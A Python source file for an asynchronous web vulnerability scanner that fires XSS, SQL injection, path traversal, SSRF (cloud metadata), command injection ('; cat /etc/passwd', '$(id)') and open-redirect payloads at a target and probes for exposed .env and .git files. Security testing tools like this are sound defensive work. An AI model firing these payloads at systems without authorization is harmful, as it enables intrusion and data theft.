#!/usr/bin/env python3
"""
AEGIS-X Reborn - Real Vulnerability Scanner
A completely rebuilt vulnerability scanner that actually finds vulnerabilities
Focus: Real testing, not fancy logging
"""

import asyncio
import aiohttp
import logging
import json
import time
import os
import re
import random
import string
import hashlib
import base64
import urllib.parse
import subprocess
import tempfile
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple, Set
from datetime import datetime
from dataclasses import dataclass, asdict
import argparse
import sys

# Import Nuclei integration
from nuclei_integration import NucleiIntegration

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/aegis_x_reborn.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class Vulnerability:
    """Simple, effective vulnerability representation"""
    id: str
    type: str
    severity: str
    url: str
    title: str
    description: str
    payload: str
    proof_of_concept: str
    impact: str
    remediation: str
    confidence: float
    verified: bool
    timestamp: str

class RealVulnerabilityScanner:
    """Real vulnerability scanner that actually finds vulnerabilities"""
    
    def __init__(self):
        self.session = None
        self.vulnerabilities = []
        self.target_info = {}
        self.nuclei = NucleiIntegration()
        
        # Real payloads that work
        self.xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<body onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<keygen onfocus=alert("XSS") autofocus>',
            '<video><source onerror="alert(\'XSS\')">',
            '<audio src=x onerror=alert("XSS")>',
            '<details open ontoggle=alert("XSS")>',
            '<marquee onstart=alert("XSS")>',
        ]
        
        self.sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin'#",
            "admin'/*",
            "' OR 'x'='x",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "') OR (1=1)--",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION ALL SELECT NULL--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "1' AND (SELECT COUNT(*) FROM sysobjects)>0--",
            "1' AND (SELECT COUNT(*) FROM msysobjects)>0--",
            "1' WAITFOR DELAY '00:00:05'--",
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' AND SLEEP(5)--",
            "1'; SELECT SLEEP(5)--",
        ]
        
        self.lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "....%2F....%2F....%2Fetc%2Fpasswd",
            "/etc/passwd%00",
            "../../../etc/passwd%00",
            "....//....//....//etc/passwd%00",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=../../../etc/passwd",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "expect://id",
            "file:///etc/passwd",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline",
        ]
        
        self.ssrf_payloads = [
            "http://127.0.0.1:80",
            "http://localhost:80",
            "http://0.0.0.0:80",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/v1/",
            "http://[::1]:80",
            "http://2130706433:80",
            "http://017700000001:80",
            "http://0x7f000001:80",
            "gopher://127.0.0.1:80",
            "dict://127.0.0.1:80",
            "ftp://127.0.0.1:80",
            "file:///etc/passwd",
            "ldap://127.0.0.1:389",
        ]
        
        self.rce_payloads = [
            "; id",
            "| id",
            "& id",
            "&& id",
            "|| id",
            "`id`",
            "$(id)",
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "|| whoami",
            "`whoami`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "&& cat /etc/passwd",
            "|| cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
        ]
        
        self.common_files = [
            "robots.txt",
            "sitemap.xml",
            ".htaccess",
            ".env",
            ".git/config",
            ".git/HEAD",
            "config.php",
            "wp-config.php",
            "database.yml",
            "settings.py",
            "web.config",
            "application.properties",
            "config.json",
            "package.json",
            "composer.json",
            "Dockerfile",
            ".dockerignore",
            "backup.sql",
            "dump.sql",
            "admin.php",
            "login.php",
            "test.php",
            "phpinfo.php",
            "info.php",
            "debug.php",
        ]
    
    async def initialize(self):
        """Initialize the scanner"""
        logger.info("🔥 Initializing AEGIS-X Reborn - Real Vulnerability Scanner")
        
        # Create directories
        os.makedirs("logs", exist_ok=True)
        os.makedirs("output", exist_ok=True)
        os.makedirs("temp", exist_ok=True)
        
        # Initialize session
        timeout = aiohttp.ClientTimeout(total=30)
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=10)
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        )
        
        logger.info("✅ AEGIS-X Reborn initialized successfully")
    
    async def scan_target(self, target: str) -> List[Vulnerability]:
        """Main scanning method - actually finds vulnerabilities"""
        logger.info(f"🎯 Starting real vulnerability scan for: {target}")
        
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        vulnerabilities = []
        
        try:
            # Phase 1: Information Gathering
            logger.info("📊 Phase 1: Information Gathering")
            await self._gather_target_info(target)
            
            # Phase 2: Directory and File Discovery
            logger.info("📁 Phase 2: Directory and File Discovery")
            discovered_paths = await self._discover_paths(target)
            
            # Phase 3: Parameter Discovery
            logger.info("🔍 Phase 3: Parameter Discovery")
            parameters = await self._discover_parameters(target, discovered_paths)
            
            # Phase 4: Vulnerability Testing
            logger.info("⚡ Phase 4: Real Vulnerability Testing")
            
            # Test for XSS
            xss_vulns = await self._test_xss(target, parameters)
            vulnerabilities.extend(xss_vulns)
            
            # Test for SQL Injection
            sqli_vulns = await self._test_sqli(target, parameters)
            vulnerabilities.extend(sqli_vulns)
            
            # Test for LFI
            lfi_vulns = await self._test_lfi(target, parameters)
            vulnerabilities.extend(lfi_vulns)
            
            # Test for SSRF
            ssrf_vulns = await self._test_ssrf(target, parameters)
            vulnerabilities.extend(ssrf_vulns)
            
            # Test for RCE
            rce_vulns = await self._test_rce(target, parameters)
            vulnerabilities.extend(rce_vulns)
            
            # Test for IDOR
            idor_vulns = await self._test_idor(target, discovered_paths)
            vulnerabilities.extend(idor_vulns)
            
            # Test for File Upload
            upload_vulns = await self._test_file_upload(target, discovered_paths)
            vulnerabilities.extend(upload_vulns)
            
            # Test for Open Redirect
            redirect_vulns = await self._test_open_redirect(target, parameters)
            vulnerabilities.extend(redirect_vulns)
            
            # Phase 5: Nuclei Integration
            logger.info("🚀 Phase 5: Nuclei Template Scanning")
            nuclei_vulns = await self._run_nuclei_scan(target)
            vulnerabilities.extend(nuclei_vulns)
            
            # Phase 6: Verification
            logger.info("✅ Phase 6: Vulnerability Verification")
            verified_vulns = await self._verify_vulnerabilities(vulnerabilities)
            
            logger.info(f"🎉 Scan complete! Found {len(verified_vulns)} verified vulnerabilities")
            
            return verified_vulns
            
        except Exception as e:
            logger.error(f"❌ Scan failed: {str(e)}")
            return []
    
    async def _gather_target_info(self, target: str):
        """Gather basic information about the target"""
        try:
            async with self.session.get(target) as response:
                self.target_info = {
                    'status_code': response.status,
                    'headers': dict(response.headers),
                    'server': response.headers.get('Server', 'Unknown'),
                    'powered_by': response.headers.get('X-Powered-By', 'Unknown'),
                    'content_type': response.headers.get('Content-Type', 'Unknown'),
                    'content_length': response.headers.get('Content-Length', 'Unknown'),
                }
                
                # Check for common security headers
                security_headers = [
                    'X-Frame-Options', 'X-XSS-Protection', 'X-Content-Type-Options',
                    'Strict-Transport-Security', 'Content-Security-Policy',
                    'X-Permitted-Cross-Domain-Policies', 'Referrer-Policy'
                ]
                
                missing_headers = []
                for header in security_headers:
                    if header not in response.headers:
                        missing_headers.append(header)
                
                if missing_headers:
                    vuln = Vulnerability(
                        id=f"missing_headers_{int(time.time())}",
                        type="Security Headers",
                        severity="Low",
                        url=target,
                        title="Missing Security Headers",
                        description=f"Missing security headers: {', '.join(missing_headers)}",
                        payload="N/A",
                        proof_of_concept=f"curl -I {target}",
                        impact="Potential security risks due to missing protective headers",
                        remediation="Implement missing security headers",
                        confidence=0.9,
                        verified=True,
                        timestamp=datetime.now().isoformat()
                    )
                    self.vulnerabilities.append(vuln)
                
                logger.info(f"📊 Target info gathered: {response.status} {self.target_info['server']}")
                
        except Exception as e:
            logger.error(f"❌ Failed to gather target info: {str(e)}")
    
    async def _discover_paths(self, target: str) -> List[str]:
        """Discover paths and directories"""
        discovered = []
        
        # Test common files
        for file_path in self.common_files:
            try:
                url = f"{target.rstrip('/')}/{file_path}"
                async with self.session.get(url) as response:
                    if response.status == 200:
                        discovered.append(url)
                        logger.info(f"📁 Found: {url}")
                        
                        # Check if it's a sensitive file
                        if file_path in ['.env', 'config.php', 'wp-config.php', '.git/config']:
                            vuln = Vulnerability(
                                id=f"sensitive_file_{int(time.time())}_{file_path.replace('/', '_')}",
                                type="Information Disclosure",
                                severity="Medium",
                                url=url,
                                title=f"Sensitive File Exposed: {file_path}",
                                description=f"Sensitive file {file_path} is publicly accessible",
                                payload="N/A",
                                proof_of_concept=f"curl {url}",
                                impact="Potential exposure of sensitive configuration data",
                                remediation=f"Restrict access to {file_path}",
                                confidence=0.95,
                                verified=True,
                                timestamp=datetime.now().isoformat()
                            )
                            self.vulnerabilities.append(vuln)
                            
            except Exception:
                continue
        
        return discovered
    
    async def _discover_parameters(self, target: str, paths: List[str]) -> Dict[str, List[str]]:
        """Discover parameters in forms and URLs"""
        parameters = {}
        
        # Common parameter names to test
        common_params = [
            'id', 'user', 'page', 'file', 'path', 'url', 'redirect', 'return',
            'q', 'search', 'query', 'keyword', 'term', 'name', 'email',
            'username', 'password', 'token', 'session', 'csrf', 'callback',
            'jsonp', 'format', 'type', 'category', 'tag', 'sort', 'order',
            'limit', 'offset', 'start', 'end', 'from', 'to', 'date', 'time'
        ]
        
        # Test main target
        parameters[target] = common_params
        
        # Test discovered paths
        for path in paths[:10]:  # Limit to avoid too many requests
            parameters[path] = common_params
        
        return parameters
    
    async def _test_xss(self, target: str, parameters: Dict[str, List[str]]) -> List[Vulnerability]:
        """Test for XSS vulnerabilities"""
        vulnerabilities = []
        
        for url, params in parameters.items():
            for param in params[:5]:  # Test top 5 parameters per URL
                for payload in self.xss_payloads[:8]:  # Test top 8 XSS payloads
                    try:
                        # Test GET parameter
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        
                        async with self.session.get(test_url) as response:
                            content = await response.text()
                            
                            # Check if payload is reflected without encoding
                            if payload in content and response.status == 200:
                                vuln = Vulnerability(
                                    id=f"xss_{int(time.time())}_{param}",
                                    type="Cross-Site Scripting (XSS)",
                                    severity="Medium",
                                    url=test_url,
                                    title=f"Reflected XSS in parameter '{param}'",
                                    description=f"XSS payload reflected in parameter '{param}' without proper encoding",
                                    payload=payload,
                                    proof_of_concept=f"Visit: {test_url}",
                                    impact="Potential session hijacking, data theft, or malicious actions",
                                    remediation="Implement proper input validation and output encoding",
                                    confidence=0.8,
                                    verified=False,
                                    timestamp=datetime.now().isoformat()
                                )
                                vulnerabilities.append(vuln)
                                logger.info(f"🚨 Potential XSS found: {param} in {url}")
                                break  # Found XSS, move to next parameter
                        
                        # Small delay to avoid overwhelming the server
                        await asyncio.sleep(0.1)
                        
                    except Exception as e:
                        continue
        
        return vulnerabilities
    
    async def _test_sqli(self, target: str, parameters: Dict[str, List[str]]) -> List[Vulnerability]:
        """Test for SQL Injection vulnerabilities"""
        vulnerabilities = []
        
        for url, params in parameters.items():
            for param in params[:5]:  # Test top 5 parameters per URL
                for payload in self.sqli_payloads[:10]:  # Test top 10 SQLi payloads
                    try:
                        # Test GET parameter
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        
                        start_time = time.time()
                        async with self.session.get(test_url) as response:
                            end_time = time.time()
                            content = await response.text()
                            response_time = end_time - start_time
                            
                            # Check for SQL error messages
                            sql_errors = [
                                'mysql_fetch_array', 'mysql_num_rows', 'mysql_error',
                                'ORA-01756', 'Microsoft OLE DB Provider', 'ODBC SQL Server Driver',
                                'SQLServer JDBC Driver', 'PostgreSQL query failed',
                                'Warning: pg_', 'valid PostgreSQL result', 'Npgsql.',
                                'Driver][SQL Server]', 'OLE DB provider', 'SQLite/JDBCDriver',
                                'SQLite.Exception', 'System.Data.SQLite.SQLiteException',
                                'Warning: sqlite_', 'function.sqlite', '[SQLITE_ERROR]'
                            ]
                            
                            error_found = any(error.lower() in content.lower() for error in sql_errors)
                            
                            # Check for time-based SQLi (if response took longer than 4 seconds)
                            time_based = 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper()
                            time_delay = time_based and response_time > 4
                            
                            if error_found or time_delay:
                                severity = "High" if error_found else "Medium"
                                vuln = Vulnerability(
                                    id=f"sqli_{int(time.time())}_{param}",
                                    type="SQL Injection",
                                    severity=severity,
                                    url=test_url,
                                    title=f"SQL Injection in parameter '{param}'",
                                    description=f"SQL injection vulnerability detected in parameter '{param}'",
                                    payload=payload,
                                    proof_of_concept=f"Visit: {test_url}",
                                    impact="Potential database access, data extraction, or data manipulation",
                                    remediation="Use parameterized queries and input validation",
                                    confidence=0.9 if error_found else 0.7,
                                    verified=False,
                                    timestamp=datetime.now().isoformat()
                                )
                                vulnerabilities.append(vuln)
                                logger.info(f"🚨 Potential SQLi found: {param} in {url}")
                                break  # Found SQLi, move to next parameter
                        
                        await asyncio.sleep(0.1)
                        
                    except Exception as e:
                        continue
        
        return vulnerabilities
    
    async def _test_lfi(self, target: str, parameters: Dict[str, List[str]]) -> List[Vulnerability]:
        """Test for Local File Inclusion vulnerabilities"""
        vulnerabilities = []
        
        for url, params in parameters.items():
            for param in params[:5]:
                # Focus on file-related parameters
                if any(keyword in param.lower() for keyword in ['file', 'path', 'page', 'include', 'template']):
                    for payload in self.lfi_payloads[:8]:
                        try:
                            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                            
                            async with self.session.get(test_url) as response:
                                content = await response.text()
                                
                                # Check for common file contents
                                lfi_indicators = [
                                    'root:x:0:0:', 'daemon:x:1:1:', '/bin/bash', '/bin/sh',
                                    '[boot loader]', '[operating systems]', 'Windows Registry',
                                    '<?php', 'mysql_connect', 'database_password'
                                ]
                                
                                if any(indicator in content for indicator in lfi_indicators):
                                    vuln = Vulnerability(
                                        id=f"lfi_{int(time.time())}_{param}",
                                        type="Local File Inclusion (LFI)",
                                        severity="High",
                                        url=test_url,
                                        title=f"Local File Inclusion in parameter '{param}'",
                                        description=f"LFI vulnerability allows reading local files via parameter '{param}'",
                                        payload=payload,
                                        proof_of_concept=f"Visit: {test_url}",
                                        impact="Potential access to sensitive files and system information",
                                        remediation="Implement proper file path validation and restrictions",
                                        confidence=0.9,
                                        verified=False,
                                        timestamp=datetime.now().isoformat()
                                    )
                                    vulnerabilities.append(vuln)
                                    logger.info(f"🚨 Potential LFI found: {param} in {url}")
                                    break
                            
                            await asyncio.sleep(0.1)
                            
                        except Exception:
                            continue
        
        return vulnerabilities
    
    async def _test_ssrf(self, target: str, parameters: Dict[str, List[str]]) -> List[Vulnerability]:
        """Test for Server-Side Request Forgery vulnerabilities"""
        vulnerabilities = []
        
        for url, params in parameters.items():
            for param in params[:5]:
                # Focus on URL-related parameters
                if any(keyword in param.lower() for keyword in ['url', 'link', 'redirect', 'callback', 'webhook', 'api']):
                    for payload in self.ssrf_payloads[:8]:
                        try:
                            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                            
                            start_time = time.time()
                            async with self.session.get(test_url) as response:
                                end_time = time.time()
                                content = await response.text()
                                response_time = end_time - start_time
                                
                                # Check for SSRF indicators
                                ssrf_indicators = [
                                    'Connection refused', 'Connection timed out',
                                    'No route to host', 'Network is unreachable',
                                    'ami-id', 'instance-id', 'local-hostname',  # AWS metadata
                                    'computeMetadata', 'metadata.google.internal',  # GCP metadata
                                    'curl: (7)', 'curl: (28)', 'curl: (6)'  # curl errors
                                ]
                                
                                # Check for unusual response times (potential internal requests)
                                unusual_timing = response_time > 5 or response_time < 0.1
                                
                                indicator_found = any(indicator in content for indicator in ssrf_indicators)
                                
                                if indicator_found or unusual_timing:
                                    vuln = Vulnerability(
                                        id=f"ssrf_{int(time.time())}_{param}",
                                        type="Server-Side Request Forgery (SSRF)",
                                        severity="High",
                                        url=test_url,
                                        title=f"SSRF in parameter '{param}'",
                                        description=f"SSRF vulnerability allows making requests to internal resources via parameter '{param}'",
                                        payload=payload,
                                        proof_of_concept=f"Visit: {test_url}",
                                        impact="Potential access to internal services and sensitive data",
                                        remediation="Implement URL validation and whitelist allowed domains",
                                        confidence=0.8 if indicator_found else 0.6,
                                        verified=False,
                                        timestamp=datetime.now().isoformat()
                                    )
                                    vulnerabilities.append(vuln)
                                    logger.info(f"🚨 Potential SSRF found: {param} in {url}")
                                    break
                            
                            await asyncio.sleep(0.1)
                            
                        except Exception:
                            continue
        
        return vulnerabilities
    
    async def _test_rce(self, target: str, parameters: Dict[str, List[str]]) -> List[Vulnerability]:
        """Test for Remote Code Execution vulnerabilities"""
        vulnerabilities = []
        
        for url, params in parameters.items():
            for param in params[:3]:  # Limit RCE testing to avoid damage
                # Focus on command-related parameters
                if any(keyword in param.lower() for keyword in ['cmd', 'command', 'exec', 'system', 'shell']):
                    for payload in self.rce_payloads[:5]:  # Limited RCE testing
                        try:
                            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                            
                            async with self.session.get(test_url) as response:
                                content = await response.text()
                                
                                # Check for command execution indicators
                                rce_indicators = [
                                    'uid=', 'gid=', 'groups=',  # id command output
                                    'root:x:0:0:', 'daemon:x:1:1:',  # /etc/passwd
                                    'Microsoft Windows', 'Windows IP Configuration',  # Windows commands
                                    'total ', 'drwx', '-rw-'  # ls command output
                                ]
                                
                                if any(indicator in content for indicator in rce_indicators):
                                    vuln = Vulnerability(
                                        id=f"rce_{int(time.time())}_{param}",
                                        type="Remote Code Execution (RCE)",
                                        severity="Critical",
                                        url=test_url,
                                        title=f"RCE in parameter '{param}'",
                                        description=f"RCE vulnerability allows executing system commands via parameter '{param}'",
                                        payload=payload,
                                        proof_of_concept=f"Visit: {test_url}",
                                        impact="Complete system compromise possible",
                                        remediation="Remove command execution functionality or implement strict validation",
                                        confidence=0.95,
                                        verified=False,
                                        timestamp=datetime.now().isoformat()
                                    )
                                    vulnerabilities.append(vuln)
                                    logger.info(f"🚨 Potential RCE found: {param} in {url}")
                                    break
                            
                            await asyncio.sleep(0.2)  # Longer delay for RCE testing
                            
                        except Exception:
                            continue
        
        return vulnerabilities
    
    async def _test_idor(self, target: str, paths: List[str]) -> List[Vulnerability]:
        """Test for Insecure Direct Object Reference vulnerabilities"""
        vulnerabilities = []
        
        # Look for URLs with numeric IDs
        id_patterns = [r'/(\d+)/?$', r'[?&]id=(\d+)', r'[?&]user=(\d+)', r'[?&]order=(\d+)']
        
        for path in paths:
            for pattern in id_patterns:
                match = re.search(pattern, path)
                if match:
                    original_id = match.group(1)
                    
                    # Try different IDs
                    test_ids = [
                        str(int(original_id) + 1),
                        str(int(original_id) - 1),
                        str(int(original_id) + 10),
                        "1", "2", "999", "1000"
                    ]
                    
                    try:
                        # Get original response
                        async with self.session.get(path) as original_response:
                            original_content = await original_response.text()
                            original_length = len(original_content)
                        
                        for test_id in test_ids:
                            test_url = re.sub(pattern, lambda m: path[m.start():m.end()].replace(original_id, test_id), path)
                            
                            async with self.session.get(test_url) as response:
                                content = await response.text()
                                
                                # Check if we got different content (potential IDOR)
                                if (response.status == 200 and 
                                    len(content) > 100 and 
                                    abs(len(content) - original_length) > 50):
                                    
                                    vuln = Vulnerability(
                                        id=f"idor_{int(time.time())}_{test_id}",
                                        type="Insecure Direct Object Reference (IDOR)",
                                        severity="Medium",
                                        url=test_url,
                                        title=f"IDOR vulnerability accessing ID {test_id}",
                                        description=f"Possible unauthorized access to object with ID {test_id}",
                                        payload=test_id,
                                        proof_of_concept=f"Compare: {path} vs {test_url}",
                                        impact="Potential unauthorized access to other users' data",
                                        remediation="Implement proper authorization checks",
                                        confidence=0.7,
                                        verified=False,
                                        timestamp=datetime.now().isoformat()
                                    )
                                    vulnerabilities.append(vuln)
                                    logger.info(f"🚨 Potential IDOR found: {test_url}")
                                    break
                            
                            await asyncio.sleep(0.1)
                            
                    except Exception:
                        continue
                    
                    break  # Only test first matching pattern per path
        
        return vulnerabilities
    
    async def _test_file_upload(self, target: str, paths: List[str]) -> List[Vulnerability]:
        """Test for file upload vulnerabilities"""
        vulnerabilities = []
        
        # Look for upload forms or endpoints
        upload_indicators = ['upload', 'file', 'attach', 'media', 'image', 'document']
        
        for path in paths:
            if any(indicator in path.lower() for indicator in upload_indicators):
                try:
                    async with self.session.get(path) as response:
                        content = await response.text()
                        
                        # Look for file upload forms
                        if ('type="file"' in content or 'enctype="multipart/form-data"' in content):
                            vuln = Vulnerability(
                                id=f"upload_{int(time.time())}",
                                type="File Upload",
                                severity="Medium",
                                url=path,
                                title="File Upload Functionality Detected",
                                description="File upload functionality found - requires manual testing",
                                payload="N/A",
                                proof_of_concept=f"Visit {path} and test file upload",
                                impact="Potential malicious file upload leading to RCE",
                                remediation="Implement file type validation, size limits, and secure storage",
                                confidence=0.6,
                                verified=False,
                                timestamp=datetime.now().isoformat()
                            )
                            vulnerabilities.append(vuln)
                            logger.info(f"📁 File upload found: {path}")
                            
                except Exception:
                    continue
        
        return vulnerabilities
    
    async def _test_open_redirect(self, target: str, parameters: Dict[str, List[str]]) -> List[Vulnerability]:
        """Test for Open Redirect vulnerabilities"""
        vulnerabilities = []
        
        redirect_payloads = [
            "http://evil.com",
            "https://evil.com",
            "//evil.com",
            "///evil.com",
            "http:///evil.com",
            "https:///evil.com",
        ]
        
        for url, params in parameters.items():
            for param in params[:5]:
                if any(keyword in param.lower() for keyword in ['redirect', 'return', 'url', 'next', 'continue']):
                    for payload in redirect_payloads:
                        try:
                            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                            
                            async with self.session.get(test_url, allow_redirects=False) as response:
                                location = response.headers.get('Location', '')
                                
                                if (response.status in [301, 302, 303, 307, 308] and 
                                    'evil.com' in location):
                                    
                                    vuln = Vulnerability(
                                        id=f"redirect_{int(time.time())}_{param}",
                                        type="Open Redirect",
                                        severity="Low",
                                        url=test_url,
                                        title=f"Open Redirect in parameter '{param}'",
                                        description=f"Open redirect vulnerability via parameter '{param}'",
                                        payload=payload,
                                        proof_of_concept=f"Visit: {test_url}",
                                        impact="Potential phishing attacks and reputation damage",
                                        remediation="Validate redirect URLs against whitelist",
                                        confidence=0.8,
                                        verified=False,
                                        timestamp=datetime.now().isoformat()
                                    )
                                    vulnerabilities.append(vuln)
                                    logger.info(f"🚨 Open redirect found: {param} in {url}")
                                    break
                            
                            await asyncio.sleep(0.1)
                            
                        except Exception:
                            continue
        
        return vulnerabilities
    
    async def _run_nuclei_scan(self, target: str) -> List[Vulnerability]:
        """Run Nuclei template scanning"""
        nuclei_vulnerabilities = []
        
        try:
            # Run comprehensive Nuclei scan
            nuclei_results = await self.nuclei.run_custom_templates(target)
            
            # Convert Nuclei results to our Vulnerability format
            for result in nuclei_results:
                vuln = Vulnerability(
                    id=result['id'],
                    type=result['type'],
                    severity=result['severity'],
                    url=result['url'],
                    title=result['title'],
                    description=result['description'],
                    payload=result['payload'],
                    proof_of_concept=result['proof_of_concept'],
                    impact=result['impact'],
                    remediation=result['remediation'],
                    confidence=result['confidence'],
                    verified=result['verified'],
                    timestamp=result['timestamp']
                )
                nuclei_vulnerabilities.append(vuln)
            
            logger.info(f"🚀 Nuclei scan found {len(nuclei_vulnerabilities)} vulnerabilities")
            
        except Exception as e:
            logger.error(f"❌ Nuclei scan failed: {str(e)}")
        
        return nuclei_vulnerabilities
    
    async def _verify_vulnerabilities(self, vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
        """Verify vulnerabilities to reduce false positives"""
        verified = []
        
        for vuln in vulnerabilities:
            try:
                # Re-test the vulnerability
                if vuln.type == "Cross-Site Scripting (XSS)":
                    # For XSS, try a different payload to confirm
                    test_payload = '<img src=x onerror=alert(1)>'
                    test_url = vuln.url.replace(urllib.parse.quote(vuln.payload), urllib.parse.quote(test_payload))
                    
                    async with self.session.get(test_url) as response:
                        content = await response.text()
                        if test_payload in content:
                            vuln.verified = True
                            vuln.confidence = min(vuln.confidence + 0.1, 1.0)
                
                elif vuln.type == "SQL Injection":
                    # For SQLi, try a different payload
                    test_payload = "' AND '1'='1"
                    test_url = vuln.url.replace(urllib.parse.quote(vuln.payload), urllib.parse.quote(test_payload))
                    
                    async with self.session.get(test_url) as response:
                        content = await response.text()
                        if any(error in content.lower() for error in ['mysql', 'sql', 'oracle', 'postgresql']):
                            vuln.verified = True
                            vuln.confidence = min(vuln.confidence + 0.1, 1.0)
                
                # Add other verification logic as needed
                
                verified.append(vuln)
                await asyncio.sleep(0.1)
                
            except Exception:
                # If verification fails, still include with lower confidence
                vuln.confidence = max(vuln.confidence - 0.2, 0.1)
                verified.append(vuln)
        
        return verified
    
    async def generate_report(self, vulnerabilities: List[Vulnerability], target: str) -> str:
        """Generate comprehensive vulnerability report"""
        timestamp = int(time.time())
        report_file = f"output/aegis_x_reborn_report_{target.replace('://', '_').replace('/', '_')}_{timestamp}.json"
        
        # Calculate statistics
        total_vulns = len(vulnerabilities)
        critical_vulns = len([v for v in vulnerabilities if v.severity == "Critical"])
        high_vulns = len([v for v in vulnerabilities if v.severity == "High"])
        medium_vulns = len([v for v in vulnerabilities if v.severity == "Medium"])
        low_vulns = len([v for v in vulnerabilities if v.severity == "Low"])
        verified_vulns = len([v for v in vulnerabilities if v.verified])
        
        report_data = {
            "scan_info": {
                "target": target,
                "timestamp": datetime.now().isoformat(),
                "scanner": "AEGIS-X Reborn",
                "version": "1.0"
            },
            "statistics": {
                "total_vulnerabilities": total_vulns,
                "critical": critical_vulns,
                "high": high_vulns,
                "medium": medium_vulns,
                "low": low_vulns,
                "verified": verified_vulns,
                "verification_rate": round(verified_vulns / total_vulns * 100, 2) if total_vulns > 0 else 0
            },
            "target_info": self.target_info,
            "vulnerabilities": [asdict(vuln) for vuln in vulnerabilities]
        }
        
        # Save report
        with open(report_file, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        # Print summary
        logger.info("=" * 60)
        logger.info("🎯 AEGIS-X REBORN SCAN RESULTS")
        logger.info("=" * 60)
        logger.info(f"Target: {target}")
        logger.info(f"Total Vulnerabilities: {total_vulns}")
        logger.info(f"Critical: {critical_vulns}")
        logger.info(f"High: {high_vulns}")
        logger.info(f"Medium: {medium_vulns}")
        logger.info(f"Low: {low_vulns}")
        logger.info(f"Verified: {verified_vulns} ({round(verified_vulns / total_vulns * 100, 2) if total_vulns > 0 else 0}%)")
        logger.info(f"Report saved: {report_file}")
        logger.info("=" * 60)
        
        return report_file
    
    async def close(self):
        """Clean up resources"""
        if self.session:
            await self.session.close()

async def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="AEGIS-X Reborn - Real Vulnerability Scanner")
    parser.add_argument("target", help="Target URL to scan")
    parser.add_argument("--timeout", type=int, default=300, help="Scan timeout in seconds")
    
    args = parser.parse_args()
    
    scanner = RealVulnerabilityScanner()
    
    try:
        await scanner.initialize()
        
        # Run the scan
        vulnerabilities = await scanner.scan_target(args.target)
        
        # Generate report
        report_file = await scanner.generate_report(vulnerabilities, args.target)
        
        # Success criteria check
        critical_count = len([v for v in vulnerabilities if v.severity == "Critical"])
        high_count = len([v for v in vulnerabilities if v.severity == "High"])
        medium_count = len([v for v in vulnerabilities if v.severity == "Medium"])
        total_count = len(vulnerabilities)
        
        logger.info("🎯 Checking Success Criteria:")
        logger.info(f"✅ Total Vulnerabilities: {total_count}")
        logger.info(f"✅ Critical: {critical_count}")
        logger.info(f"✅ High: {high_count}")
        logger.info(f"✅ Medium: {medium_count}")
        
        if total_count > 0:
            logger.info("🎉 SUCCESS: Vulnerabilities found!")
        else:
            logger.info("⚠️ No vulnerabilities found - target may be well secured")
        
    except KeyboardInterrupt:
        logger.info("🛑 Scan interrupted by user")
    except Exception as e:
        logger.error(f"❌ Scan failed: {str(e)}")
    finally:
        await scanner.close()

if __name__ == "__main__":
    asyncio.run(main())